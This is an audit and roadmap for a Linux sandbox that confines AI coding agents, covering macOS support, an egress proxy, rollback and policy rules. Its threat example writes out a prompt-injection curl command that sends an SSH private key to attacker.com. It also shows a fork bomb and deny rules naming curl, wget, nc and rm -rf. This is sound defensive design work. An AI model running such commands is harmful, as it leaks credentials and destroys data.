# UNIT-01 Sandbox: Audit, Comparison & Roadmap

For Kshitij — everything the sandbox does right, what needs to change,
and exactly how to get there. Researched May 2026.

---

## 1. TL;DR

**What you got right:** Landlock + Seccomp + Cgroups is the exact
trifecta the industry recommends in 2026. Shadow rollback and entropy
threat detection put you ahead of most open-source tools.

**What's missing before this ships as serious:**
1. macOS support (Landlock is Linux-only)
2. Network egress proxy with domain allowlisting
3. Expose shadow rollback over the UDS socket
4. Resource budgets (fuel/cgroups) exposed via JSON-RPC
5. Per-command policy language (beyond lock/run/root modes)
6. One-page threat-model doc for enterprise buyers

Items 1–3 are must-haves. 4–5 are differentiators. 6 is packaging.

---

## 2. Current State — What's Already Good

Your sandbox uses **all three kernel-level isolation primitives** that
2026 industry research agrees are necessary:

| Primitive | What it does | Your status |
|---|---|---|
| **Landlock** | Filesystem/network ACLs per-process, no root needed, irreversible once applied. Same layer Sandlock (2026 startup) uses. | ✅ Implemented |
| **Seccomp-bpf** | Blocks dangerous syscalls at the kernel entry point — `ptrace`, `mount`, `unshare`, `pivot_root`, `kexec_load`, `bpf`, `perf_event_open`. | ✅ Implemented |
| **Cgroups** | CPU, memory, OOM limits per process group. Prevents fork bombs and runaway memory. | ✅ Implemented |

Beyond the primitives, you also have features most open-source
sandboxes don't:

- **Shadow filesystem with rollback** — entire fs state capture and
  revert per session. Claude Code doesn't have this.
- **Entropy-based threat detection** — scans for packed/malicious
  binaries. Unique among coding-agent sandboxes.
- **Hash DB (threat signatures)** — blocks known-malicious files.
- **Quarantine** — suspicious files moved aside, not deleted.
- **WASM execution path** — forward-looking, nobody else has this in
  a sandbox context.
- **Three security modes** (lock/run/root) — matches Claude Code's
  permission tiers.

**Source references:**
- [Zylos Research — AI Agent Sandboxing 2026](https://zylos.ai/research/2026-04-04-ai-agent-sandboxing-security-isolation)
- [Sandlock paper — Landlock + Seccomp split enforcement](https://arxiv.org/html/2605.26298v1)
- [Multikernel — "Processes Are All You Need" (Landlock deep-dive)](https://multikernel.io/2026/03/14/introducing-sandlock)
- [UBOS — Linux sandboxing best practices](https://ubos.tech/news/how-to-securely-sandbox-ai-agents-on-linux-best-practices-and-tools)

---

## 3. Priority 1 — macOS Support (CRITICAL)

### The Problem

Landlock, Seccomp, and Cgroups are **Linux kernel features**. macOS
has none of them. Your Rust code won't even compile on macOS for
these modules. Currently the sandbox is Linux-only, which means every
developer on a Mac (which is ~70% of the AI-agent developer market)
can't use it directly.

### What macOS Has Instead

| Need | Linux | macOS |
|---|---|---|
| Filesystem ACL | **Landlock** (stable, no root) | **Seatbelt** (deprecated by Apple 2018, still functional) |
| Syscall filtering | **Seccomp-bpf** | **None** (Apple has no equivalent public API) |
| Resource limits | **Cgroups v2** | `launchd` limits (much weaker) |
| Hypervisor | KVM | **VZVirtualization.framework** (Apple native, ARM only) |

### Approach A: VM Bundle (SHORT-TERM, RECOMMENDED)

The simplest path: **distribute a lightweight Linux VM with the
sandbox binary inside it**, using Apple's native virtualization
framework. Your Rust sandbox runs on a real Linux kernel inside the
VM, so Landlock + Seccomp + Cgroups all work exactly as they do on
native Linux. The Unix socket is forwarded between the VM and macOS
host.

**Three implementations exist today:**

#### A1. Vibe (simplest, best fit)

A ~1MB single binary, zero dependencies. You type `vibe` in a
directory, and ~10 seconds later you're inside a Linux VM with the
current dir mounted. Uses Apple's native `VZVirtualMachine` API (not
QEMU, not Docker).

```
# User workflow:
brew install vibe
cd ~/my-project
vibe -- sandbox daemon --socket /tmp/ruthen/sandbox.sock
```

The orchestrator just connects to `/tmp/ruthen/sandbox.sock` — it
doesn't know or care that the sandbox is inside a VM.

**References:**
- [Vibe GitHub](https://github.com/lynaghk/vibe)
- [Vibe announcement](https://kevinlynagh.com/newsletter/2026_02_01_vibe)
- [Lobsters discussion — Vibe vs alternatives](https://lobste.rs/s/6ifznf/vibe_easy_vm_sandboxes_for_llm_agents_on)

**Details on how Vibe works:** It uses Apple's
`VZVirtualMachineConfiguration` API with a Linux kernel + initramfs.
The <1MB binary embeds a tiny Alpine-like Linux. No QEMU, no
Docker, no daemon. The folder you run it in is mounted via virtio-fs.

#### A2. Apple Container (macOS Tahoe, 2025+)

Apple's own container runtime that ships with macOS Tahoe. Creates
micro-VMs in **<1 second**. Can run standard OCI/Docker images. No
background daemon, no license fee. The whole thing is ~10MB and
Apple-supported.

```
# User workflow:
container run --rm -v $(pwd):/workspace sandbox:latest
```

**One gotcha:** Image building has a networking bug (403 errors on
HTTP). Workaround: build with Docker, push to local registry, pull
into Apple Container.

**References:**
- [Simon Emanuel Schmid — Apple Container for Claude Code sandbox](https://www.ses.box/posts/sandbox-claude-apple-container)
- Requires macOS Tahoe (26+), ARM only

#### A3. Roll your own with VZVirtualization.framework

~500 lines of Swift, no third-party dependencies. Apple provides the
`Virtualization.framework` natively. You'd create a thin Swift CLI
that:
1. Loads a Linux kernel + initramfs (you provide)
2. Boots it as a VZVirtualMachine
3. Forwards a virtio-socket from the VM to a host Unix socket

This is what Vibe does internally, but you'd own the full stack.

```
// Pseudo-code (50 lines of the ~500):
import Virtualization

let config = VZVirtualMachineConfiguration()
config.bootLoader = VZLinuxBootLoader(kernelURL: kernelURL)
config.socketDevices = [virtioSocket]
let vm = VZVirtualMachine(configuration: config)
vm.start()
```

**References:**
- [Apple VZVirtualMachine docs](https://developer.apple.com/documentation/virtualization)
- [Tart — macOS VM management using VZ](https://github.com/cirruslabs/tart)

#### A4. Lima (heavier but more flexible)

Runs Linux VMs on macOS using QEMU (with VZ accelerator). Can
auto-mount the host filesystem, forward ports, and manage multiple
VMs. Heavier than Vibe (full QEMU stack) but more configurable.

**References:**
- [Lima GitHub](https://github.com/lima-vm/lima)
- [Colima (Lima wrapper for Docker)](https://github.com/abiosoft/colima)

### Recommendation for Approach A

Use **Vibe** as the launcher in the short term (days). It's a single
`brew install` for the user, nothing else to configure. The sandbox
binary runs inside the VM unchanged.

If you want a tight integrated experience, **roll your own with
VZVirtualization in ~500 lines of Swift**. Ship a single `.app`
bundle or CLI binary that embeds a Linux kernel + initramfs + your
sandbox binary.

### Approach B: Seatbelt Backend (LONG-TERM)

Write a native macOS sandbox backend using Seatbelt (Apple's Mandatory
Access Control framework). This avoids the VM overhead and battery
drain, but:

- **`sandbox-exec` was deprecated by Apple in 2018.** It still works,
  and Apple uses Seatbelt internally for dozens of system services
  (`/System/Library/Sandbox/Profiles/`), but it's a private API that
  could break in a future macOS release.
- **No syscall filtering equivalent.** macOS has no Seccomp. You
  can't block individual syscalls.
- **No cgroups equivalent.** Resource limits via `setrlimit` and
  `launchd` are much weaker.

**References:**
- [nono — uses Landlock on Linux, Seatbelt on macOS](https://dev.to/lukehinds/nono-the-ultimate-coding-agent-security-tool-sandbox-and-supercharge-claude-code-in-just-two-87l)
- [Safehouse — macOS-only sandbox for AI agents](https://tessl.io/blog/safehouse-sandboxes-ai-coding-agents-on-macos)
- [Apple Sandbox Guide v1.0 (reverse-engineered Seatbelt docs)](https://reverse.put.as/wp-content/uploads/2011/09/Apple-Sandbox-Guide-v1.0.pdf)
- [Seatbelt sandbox profile tracing for macOS](https://gist.github.com/n8henrie/eaaa1a25753fadbd7715e85a38b99831)
- [Hacker News — Sandbox-safe macOS gateway for AI agents](https://news.ycombinator.com/item?id=46893105)

**Who takes this approach in 2026:**
- **nono** — Seatbelt on macOS, Landlock on Linux. Open source.
  `brew install nono` then `nono run --allow-cwd --profile
  claude-code -- claude`.
- **Codex CLI (OpenAI)** — Seatbelt on macOS, Landlock + seccomp on
  Linux. Confirmed by Simon Willison's analysis, Nov 2025.
- **Safehouse** — macOS-only, open-source Seatbelt wrapper.

**Limitations of Seatbelt vs Landlock:**
- Landlock is a proper LSM with fine-grained path-based rules
- Seatbelt uses a DSL with broader categories (file-read\*,
  file-write\*, network\*, ipc\*)
- Seatbelt can't do "allow writes only to `./src/` but not
  `./src/node_modules/`" — it's coarser
- Seatbelt can't restrict specific syscalls (that's Seccomp's job)
- Seatbelt is a private API; Landlock is a documented LSM

### Final macOS Recommendation

**Short-term (ship this month):** Use Approach A1 (Vibe) or A2
(Apple Container). Zero code changes to the sandbox. Just ship a
launcher script. The orchestrator connects to the sandbox via UDS
the same way regardless of platform.

**Medium-term (next quarter):** Write Approach B (Seatbelt backend)
in parallel with the VM approach. Give users a choice: "native macOS
(faster, battery-friendly)" vs "VM (full Landlock/Seccomp/Cgroups)."

---

## 4. Priority 2 — Network Egress Proxy (CRITICAL)

### The Problem

Right now, if a prompt injection tells the agent `curl
https://attacker.com/exfil?$(cat ~/.ssh/id_rsa)`, the sandbox either
blocks all network (breaking npm/git/gem installs) or allows all
network (allowing exfiltration).

The industry solution is a **local forward proxy with domain
allowlisting**.

### How It Works

```
┌─────────────────────────────────┐
│ Agent wants: npm install express │
│  → Sandbox runs npm install      │
│  → npm needs to reach            │
│    registry.npmjs.org:443        │
│  → TCP connect() intercepted     │
│  → Landlock says: allowed?       │
└─────────────────────────────────┘
         │ blocked? yes/no
         ▼
┌─────────────────────────────────┐
│ Local proxy (127.0.0.1:8080)    │
│  Allowlist:                     │
│  ✅ registry.npmjs.org          │
│  ✅ api.github.com              │
│  ✅ pypi.org                    │
│  ❌ * (everything else)         │
└─────────────────────────────────┘
```

### Implementation Approaches

#### C1. Environment variable injection (5 lines of code)

Set `HTTP_PROXY`, `HTTPS_PROXY`, and `NO_PROXY` to point at a local
proxy before spawning the process. Most tools (npm, pip, curl, git)
respect these env vars. This is the **minimum viable approach**.

In your `handle_execute` function, before spawning `sh -c`:

```rust
let proxy_addr = "http://127.0.0.1:8080";
command.env("HTTP_PROXY", proxy_addr)
       .env("HTTPS_PROXY", proxy_addr)
       .env("NO_PROXY", "localhost,127.0.0.1,/var/run/*");
```

#### C2. Use an existing proxy (recommended ship path)

Bundle a tiny proxy like `tinyproxy` or write a 50-line Rust TCP
forwarder that checks a domain allowlist before connecting.

**Bundled with the sandbox binary:**
```rust
// Pseudo-code for a proxy task
fn run_proxy(allowlist: &[&str]) {
    let listener = TcpListener::bind("127.0.0.1:8080")?;
    for stream in listener.incoming() {
        let host = extract_tls_sni(&stream)
            .or_else(|| extract_http_host(&stream));
        if allowlist.contains(&host) {
            forward(stream, host);
        } else {
            reject(stream, "domain not allowed");
        }
    }
}
```

#### C3. Seccomp + Landlock combination

Use Landlock to block all TCP connect() by default, then Seccomp
user-notify to inspect each connect() syscall's destination at
runtime. This is what **Sandlock** does — and it allows dynamic
decisions ("allow npm install but not curl exfiltration") without
a separate proxy binary.

This approach is more complex but doesn't require a proxy process.
It's also TOCTOU-safe (the kernel freezes the process while you
decide).

**Reference:** [Sandlock paper, §5.1 — TOCTOU-safe runtime policy](https://arxiv.org/abs/2605.26298)

### Recommendation

**Ship C1 + C2.** Bundle a tiny proxy, set env vars, done. It's 20
lines of Rust and covers 95% of real-world tools. C3 is the
long-term elegant solution.

### The Allowlist

Start with these domains and make the list configurable:

```
registry.npmjs.org
registry.yarnpkg.com
pypi.org
files.pythonhosted.org
crates.io
static.crates.io
github.com
api.github.com
raw.githubusercontent.com
rubygems.org
ghcr.io
index.docker.io
auth.docker.io
registry-1.docker.io
```

**References:**
- [Morph — AI Coding Agent Security (compares proxy approaches)](https://www.morphllm.com/ai-coding-agent-security)
- [TrueFoundry — Claude Code sandboxing: Network isolation](https://www.truefoundry.com/blog/claude-code-sandboxing)
- [Claude Code uses a local proxy with domain allowlisting per project](https://docs.claude.code/sandboxing)

---

## 5. Priority 3 — Expose Shadow Rollback Over UDS

### What You Already Have

Your `shadow/` module has working rollback. The CLI has a `Rollback`
subcommand. But the orchestrator can't call it — there's no
`rollback` JSON-RPC method in the socket handler.

### What to Add

In `socket/mod.rs`, in the `process_request` match block:

```rust
"rollback" => handle_rollback(request, state).await,
```

The handler takes a session ID and rolls back filesystem changes.
The orchestrator calls this automatically when the user undoes an
edit or resets a workspace.

### Why This Matters

This is your **unique differentiator**. Claude Code does not have
filesystem rollback. Codex does not have filesystem rollback. nolo
and Safehouse don't have it. You already wrote the code — just wire
it to the socket.

---

## 6. Priority 4 — Expose Resource Budgets (Fuel) via JSON-RPC

### What You Already Have

Your `cage` module has a `fuel` parameter. The CLI accepts
`--fuel N`. But the UDS interface doesn't pass fuel through.

### What to Change

In `handle_execute`, read an optional `fuel` param from the JSON-RPC
request and pass it to the cage:

```rust
let fuel = request.params.get("fuel")
    .and_then(|v| v.as_u64());
```

The orchestrator sets fuel per-command: `bash: { fuel: 30_000 }`
means "30 seconds max." The orchestrator can also set default budgets
in the config.

### Why This Matters

Without fuel, a simple `:(){ :|:& };:` fork bomb or `npm install`
on a 200MB package with slow network runs until the system OOMs.
Cgroups catch the big stuff but fuel gives a predictable timeout.

---

## 7. Priority 5 — Per-Command Policy Language

### The Problem

Right now there are 3 modes: lock, run, root. Real agents need
finer control:

```
allow: [read, write, glob] on path /Users/me/project
allow: bash if command starts with "npm" or "cargo" or "python"
deny:  bash if command contains "curl" or "wget" or "nc"
deny:  bash if command contains "rm -rf"
```

### What to Do

Don't build a DSL. Use JSON. Define a policy file that's loaded at
sandbox startup:

```json
{
  "default_action": "ask",
  "rules": [
    {
      "pattern": "^npm (install|run|build|test)",
      "action": "allow",
      "description": "Package management"
    },
    {
      "pattern": "curl .* /etc/",
      "action": "deny",
      "description": "Block credential exfiltration"
    },
    {
      "pattern": "rm -rf",
      "action": "deny",
      "description": "Prevent destructive deletes"
    },
    {
      "path": "/Users/me/.ssh",
      "access": "deny",
      "description": "Never touch SSH keys"
    }
  ]
}
```

### Where This Goes

Add a `set_policy` JSON-RPC method (you already have `set_policy`
but it only sets the mode string). Extend it to accept a full policy
object. The orchestrator sends it once when a session starts.

### Industry Context

- **Claude Code** uses a command whitelist + permission prompts.
  Users approve/deny per command. The whitelist is learned over time.
- **Codex** has 3 built-in modes: read-only, auto, full-access. No
  custom rules.
- **nono** uses Landlock paths for filesystem, blanket network
  allow/deny. No per-command rules.
- **OpenAI's Codex CLI sandbox analysis** (Simon Willison, Nov 2025):
  confirms Seatbelt on macOS, Landlock + seccomp on Linux.

**Reference:** [Pierce Freeman — Deep dive on agent sandboxes](https://pierce.dev/notes/a-deep-dive-on-agent-sandboxes)

---

## 8. Priority 6 — Threat Model Document

Write one page (not 20) that answers:

1. What can a prompt-injected agent do?
2. What can't it do (and why)?
3. What's the blast radius?
4. How does each layer (Landlock, Seccomp, Cgroups, shadow, threat
   detection) prevent specific attacks?
5. What's the escape path if every layer fails?

This is what separates "we wrote code" from "we built a product."
Enterprises buy the document as much as they buy the code.

---

## 9. Industry Comparison Table (May 2026)

| Feature | UNIT-01 | Claude Code | Codex CLI | nono | Safehouse |
|---|---|---|---|---|---|
| **Linux isolation** | Landlock+Seccomp+Cgroups | bubblewrap | Landlock+seccomp | Landlock | ❌ (macOS only) |
| **macOS isolation** | ❌ | seatbelt | seatbelt | seatbelt | seatbelt |
| **Network proxy** | ❌ | ✅ domain allowlist | ❌ (block all by default) | ❌ | ❌ |
| **Fs rollback** | ✅ shadow module | ❌ | ❌ | ❌ | ❌ |
| **Threat detection** | ✅ entropy+hash | ❌ | ❌ | ❌ | ❌ |
| **WASM execution** | ✅ | ❌ | ❌ | ❌ | ❌ |
| **Resource budgets** | ✅ fuel (CLI only) | ❌ | ❌ | ❌ | ❌ |
| **Per-command policy** | ❌ | ✅ whitelist | ❌ | path ACLs | path ACLs |
| **Open source** | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Browser/desktop** | ❌ | ❌ | ❌ | ❌ | ❌ |

---

## 10. Recommended Ship Order

### Phase 1 — "It works on my machine" (1-2 weeks)

- [ ] **macOS:** Write a 50-line shell script that detects Linux vs
  macOS. On macOS, check for Vibe or Apple Container and auto-install
  if missing. The sandbox UDS is forwarded to the host.
- [ ] **Network proxy:** Add a 100-line TCP proxy with an allowlist
  to the sandbox binary. Set `HTTP_PROXY`/`HTTPS_PROXY` before
  spawning commands.
- [ ] **Rollback UDS:** Wire the existing `Rollback` subcommand as a
  JSON-RPC method.

After Phase 1, the sandbox works on both platforms with network
protection and rollback. This is shippable.

### Phase 2 — "This shit is serious" (1-2 months)

- [ ] **macOS Seatbelt backend:** Write a native macOS backend using
  `sandbox-exec`. Gives users a no-VM option.
- [ ] **Fuel over UDS:** Accept `fuel` parameter in `cage_execute`.
- [ ] **Policy language:** JSON-based per-command rules, loaded from
  a config file.
- [ ] **Threat model doc:** One page. Cover everything.

### Phase 3 — "Industry leader" (3-6 months)

- [ ] **Native macOS Swift launcher:** Replace the Vibe dependency
  with your own VZ-based launcher. Ship as a single `.app` bundle.
- [ ] **MicroVM provider plugin system:** Let users choose between
  native Landlock (Linux), Seatbelt (macOS), Firecracker (enterprise),
  and Docker (simple).
- [ ] **Sandlock-style seccomp user-notify:** Dynamic per-connection
  network decisions without a proxy binary.
- [ ] **OCI-compatible image building:** Let users define the sandbox
  environment with a Dockerfile.

---

## 11. Key References (All Searched May 2026)

### Industry Reports
- [Zylos Research — AI Agent Sandboxing 2026](https://zylos.ai/research/2026-04-04-ai-agent-sandboxing-security-isolation)
- [AgentMarketCap — Sandboxed Code Execution 2026: E2B vs Modal vs Daytona](https://agentmarketcap.ai/blog/2026/04/10/sandboxed-code-execution-ai-agents-e2b-modal-daytona)
- [BeyondScale — AI Agent Sandboxing Enterprise Security Guide 2026](https://beyondscale.tech/blog/ai-agent-sandboxing-enterprise-security-guide)
- [Fastio — Best AI Agent Sandboxes 2026](https://fast.io/resources/best-ai-agent-sandboxes)
- [Northflank — How to sandbox AI agents 2026](https://northflank.com/blog/how-to-sandbox-ai-agents)
- [Morph — AI Coding Agent Security 2026: Incidents, Attacks & Defenses](https://www.morphllm.com/ai-coding-agent-security)

### Academic / Technical
- [Sandlock: Confining AI Agent Code with Unprivileged Linux Primitives (arxiv, May 2026)](https://arxiv.org/abs/2605.26298)
- [Multikernel — Processes Are All You Need for AI Sandboxing](https://multikernel.io/2026/03/14/introducing-sandlock)

### macOS Sandbox Tools
- [Vibe — Easy VM sandboxes for LLM agents on macOS](https://github.com/lynaghk/vibe)
- [nono — Sandbox for AI agents (Landlock + Seatbelt)](https://dev.to/lukehinds/nono-the-ultimate-coding-agent-security-tool-sandbox-and-supercharge-claude-code-in-just-two-87l)
- [Safehouse — macOS sandbox for AI agents](https://tessl.io/blog/safehouse-sandboxes-ai-coding-agents-on-macos)
- [Apple Container for Claude Code sandbox (macOS Tahoe)](https://www.ses.box/posts/sandbox-claude-apple-container)
- [Lima — Linux VMs on macOS](https://github.com/lima-vm/lima)
- [Tart — macOS VM management](https://github.com/cirruslabs/tart)
- [OpenAI Codex CLI sandbox analysis (Simon Willison)](https://simonwillison.net/2025/Nov/9/codex-sandbox-investigation/)

### Apple Seatbelt / Sandbox
- [Apple Sandbox Guide v1.0 (reverse-engineered)](https://reverse.put.as/wp-content/uploads/2011/09/Apple-Sandbox-Guide-v1.0.pdf)
- [macOS Seatbelt sandbox trace script](https://gist.github.com/n8henrie/eaaa1a25753fadbd7715e85a38b99831)
- [Hacker News — macOS gateway for AI agents](https://news.ycombinator.com/item?id=46893105)

### Sandbox Comparisons
- [Superagent — AI Code Sandbox Benchmark 2026](https://www.superagent.sh/blog/ai-code-sandbox-benchmark-2026)
- [Paperclipped — MicroVMs vs gVisor vs WASM comparison](https://www.paperclipped.de/en/blog/ai-agent-sandboxing-code-execution)
- [Alex Cloudstar — Sandboxing AI-Generated Code: E2B vs Vercel vs Modal vs Daytona](https://www.alexcloudstar.com/blog/sandboxing-ai-generated-code-execution-2026)
- [Docker — Docker Sandboxes for Claude Code (March 2026)](https://www.docker.com/blog/docker-sandboxes-run-claude-code-and-other-coding-agents-unsupervised-but-safely/)
- [Qovery — Claude Code Sandbox Guide](https://www.qovery.com/blog/claude-code-sandbox-guide)
- [TrueFoundry — Claude Code Sandboxing: Network Isolation](https://www.truefoundry.com/blog/claude-code-sandboxing)

---

*Generated for Kshitij — May 31, 2026*
*Based on analysis of the UNIT-01 sandbox codebase at `/Users/lichi/ruthen/unit-01/sandbox/`*
